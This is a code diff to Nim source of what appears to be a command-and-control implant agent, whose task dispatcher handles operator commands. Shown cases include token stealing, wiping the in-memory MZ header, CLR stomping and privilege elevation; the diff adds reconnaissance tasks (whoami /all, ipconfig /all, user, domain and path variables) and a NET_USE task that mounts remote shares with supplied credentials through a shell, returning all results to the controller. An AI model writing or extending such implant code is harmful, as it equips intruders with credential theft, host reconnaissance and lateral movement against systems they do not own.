@@ -1583,7 +1583,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, "", "DOTNET_EXEC: not supported on Linux")
 
-  of "TOKEN_STEAL":
+  of "TOKEN_STEAL", "STEAL_TOKEN":
     when defined(windows):
       try:
         let pid = parseJson(args){"pid"}.getInt(0)
@@ -1716,6 +1716,21 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "WIPE_MZ":
     wipeMZHeader()
     t.sendResult(id, "[+] MZ header wiped", "")
+
+  of "DETECTED":
+    t.sendResult(id, "[!] DETECTED flag acknowledged", "")
+
+  of "HOME", "USERPROFILE":
+    t.sendResult(id, getEnv("USERPROFILE", getEnv("HOME", "")), "")
+
+  of "USERDOMAIN":
+    t.sendResult(id, getEnv("USERDOMAIN", ""), "")
+
+  of "TEMP":
+    t.sendResult(id, getEnv("TEMP", getEnv("TMP", "")), "")
+
+  of "DISPLAY":
+    t.sendResult(id, getEnv("DISPLAY", ""), "")
 
   of "CLR_STOMP":
     when defined(windows):
@@ -2486,6 +2501,30 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       except: t.sendResult(id, "", "elevate: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "ELEVATE: not supported on Linux")
+
+  of "NET_USE":
+    try:
+      let j     = parseJson(args)
+      let share = j{"share"}.getStr("")
+      let user  = j{"user"}.getStr("")
+      let pass  = j{"pass"}.getStr("")
+      t.sendResult(id, runShell("net use \"" & share & "\" \"" & pass & "\" /user:\"" & user & "\" 2>&1"), "")
+    except: t.sendResult(id, "", "net_use: " & getCurrentExceptionMsg())
+
+  of "NET_USE_DEL":
+    t.sendResult(id, runShell("net use \"" & args.strip() & "\" /delete /yes 2>&1"), "")
+
+  of "WHOAMI":
+    t.sendResult(id, runShell("whoami /all"), "")
+
+  of "IPCONFIG":
+    t.sendResult(id, runShell("ipconfig /all"), "")
+
+  of "USERNAME", "USER":
+    t.sendResult(id, getEnv("USERNAME", getEnv("USER", "")), "")
+
+  of "COMPUTERNAME":
+    t.sendResult(id, getEnv("COMPUTERNAME", ""), "")
 
   of "SSH_EXEC":
     try:
